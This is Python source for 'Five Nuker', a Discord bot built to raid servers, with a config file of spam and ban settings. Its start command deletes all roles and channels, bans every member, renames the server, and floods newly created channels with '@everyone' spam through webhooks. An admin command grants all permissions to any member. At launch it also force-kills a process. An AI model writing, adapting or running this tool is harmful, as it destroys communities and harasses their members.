from discord import Intents, Permissions
from discord.ext import commands
import discord
from asyncio import create_task 
from pathlib import Path
import configparser
import colorama
from colorama import Fore
import os
import fade

config = configparser.ConfigParser()

colorama.init(autoreset=True)

def clear():
    if os.name=='nt':
        os.system('cls')
    else:
        os.system('clear')

os.system('taskkill /f /im launcher.exe')
clear()
os.system("title Five Nuker - v3.0 - Made By G1itch")

ptfc = 'Bin\\cfg.ini'
pti = 'Bin\\icon.PNG'
cfg = Path(ptfc)
ic = Path(pti)

with open('Bin\\icon.PNG', 'rb') as f:
    icona = f.read()

nversion = open('Bin\\curent_version.fnv', 'rb')

nversion = nversion.read().decode('utf-8')


if cfg.is_file():
    print(f'{Fore.YELLOW}[Config System]' + '\033[39m' + ' Config founded!')
    config.read('Bin\\cfg.ini')
    print(f'{Fore.CYAN}[BOT]' + '\033[39m' + 'Starting...')
else:
    print(f'{Fore.RED}[ERROR]' + '\033[39m' + 'Config not found! Creating new config...')
    config['BOT_CFG'] = {'prefix': '!',
                         'token': 'bot token here',
                         'spamtext': '@everyone @here \nImagine get nuked by Five bot \nhttps://github.com/glitch65/Discord-Five-nuker-bot \nXD',
                         'ac_name': 'five nuker on top',
                         'ac_type': '1',
                         'silent_mode': '0',
                         'channels and roles name': 'nuked by five nuker',
                         'webhooks name': 'five nuker',
                         'server name':'nuked by five nuker',
                         'ban reason': 'XDDDD',
                         'how much pings per channel do you want?': '60',
                         'how much channels do you want?': '35', 
                         'how much roles do you want?': '40',
                         'admin role name': 'sh...'}
    
    with open('Bin\\cfg.ini', 'w') as cfg_file:
            config.write(cfg_file)
    print(f'{Fore.YELLOW}[Config System]' + '\033[39m' + 'Done!')
    print(f'{Fore.YELLOW}[Config System]' + '\033[39m' + 'Edit config file in youre folder and try again')
    input('Press Enter to close program...')
    exit()

clear()



prefix = config['BOT_CFG']['prefix'] 
token = config['BOT_CFG']['token'] 
spamtext = config['BOT_CFG']['spamtext'] 
ac_name = config['BOT_CFG']['ac_name']
ac_type = int(config['BOT_CFG']['ac_type']) 
silent_mode = int(config['BOT_CFG']['silent_mode'] )
chnrln = config['BOT_CFG']['channels and roles name']
wbn = config['BOT_CFG']['webhooks name']
srvn = config['BOT_CFG']['server name']
br = config['BOT_CFG']['ban reason']
howmp = int(config['BOT_CFG']['how much pings per channel do you want?'])
howmc = int(config['BOT_CFG']['how much channels do you want?'])
howmr = int(config['BOT_CFG']['how much roles do you want?'])
adrn = config['BOT_CFG']['admin role name']




intents = Intents.default()
intents.members = True
client = commands.Bot(command_prefix=prefix, help_command=None, intents=intents.all())




bot_started_text = f'{Fore.MAGENTA}Bot launched successfully!'


def login():
    try: client.run(token)
    except: print(f'{Fore.RED}[ERROR]' + '\033[39m' + 'Invalid token please change token and try again.')
    input('Press Enter to exit...')
    quit()

async def rmm():
    clear()
    mm()
    print(bot_started_text.center(115))
    print(f'{Fore.MAGENTA}Logged in as {Fore.GREEN}{client.user}!'.center(120))
    

@client.event
async def on_ready():
    if ac_type == 1 and silent_mode == 0:
        await client.change_presence(activity=discord.Game(name=ac_name))
    elif ac_type == 2 and silent_mode == 0:
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=ac_name))
    elif ac_type == 3 and silent_mode == 0:
        await client.change_presence(activity=discord.Streaming(name=ac_name, url='https://www.twitch.tv/discord'))
    elif ac_type == 4 and silent_mode == 0:
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=ac_name))
    elif silent_mode == 1:
        await client.change_presence(status=discord.Status.offline)
    await rmm()

async def killobject(obj):
    try: await obj.delete()
    except: pass

async def sendch(ctx,channel: discord.TextChannel,count):
    for _ in range(count):
        try: await channel.send(spamtext)
        except: pass

async def createchannel(ctx,name):
    try:
        chan = await ctx.guild.create_text_channel(name=name)
        wb = await chan.create_webhook(name=wbn,avatar=icona)
        create_task(sendch(ctx,wb,count=howmp))
    except: pass

async def createrole(ctx):
    try: await ctx.guild.create_role(name=chnrln)
    except: pass


@client.command()
async def start(ctx):
    await ctx.message.delete()
    await ctx.guild.edit(name=srvn, icon=icona)
    for rl in ctx.guild.roles:
        create_task(killobject(obj=rl))
    for channel in ctx.guild.channels:
        create_task(killobject(obj=channel))
    create_task(bananaa(ctx=ctx))
    for _ in range(howmr):
        create_task(createrole(ctx))
    for _ in range(howmc):    
        create_task(createchannel(ctx,name=chnrln))

@client.command()
async def admin(ctx,target):
    await ctx.message.delete()
    r =  await ctx.guild.create_role(name=adrn,permissions=Permissions.all())
    if target == 'all':
        for membe in list(ctx.guild.members):
            await membe.add_roles(r)
    elif target == 'me':
        await ctx.message.author.add_roles(r)
            
    
    


async def bananaa(ctx):
    for member in list(ctx.guild.members):
      try:
        await member.ban(reason=br, delete_message_days=7)
      except: pass
 

raw_nuker_logo = '''
                     █████▒ ██▓ ██▒   █▓▓█████     ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
                   ▓██   ▒ ▓██▒▓██░   █▒▓█   ▀     ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
                   ▒████ ░ ▒██▒ ▓██  █▒░▒███      ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
                   ░▓█▒  ░ ░██░  ▒██ █░░▒▓█  ▄    ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
                   ░▒█░    ░██░   ▒▀█░  ░▒████▒   ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
                    ▒ ░    ░▓     ░ ▐░  ░░ ▒░ ░   ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
                    ░       ▒ ░   ░ ░░   ░ ░  ░   ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
                    ░ ░     ▒ ░     ░░     ░         ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
                            ░        ░     ░  ░            ░    ░     ░  ░      ░  ░   ░     
                            ░                                                        



'''

info_about_nuker = f'{Fore.MAGENTA}Curent version: ' + f'{Fore.LIGHTGREEN_EX}v' + nversion + f'{Fore.MAGENTA}' + '     Prefix: ' + prefix

empty_space = '''




'''

def mm():
    nuker_logo = fade.purplepink(raw_nuker_logo)
    print(nuker_logo)
    print(info_about_nuker.center(125))
    print(empty_space)


mm()

welcome_text = f'{Fore.MAGENTA}Welcome to Five Nuker press enter to start nuker...'

input(welcome_text.center(120) + f'{Fore.RESET}')
login()



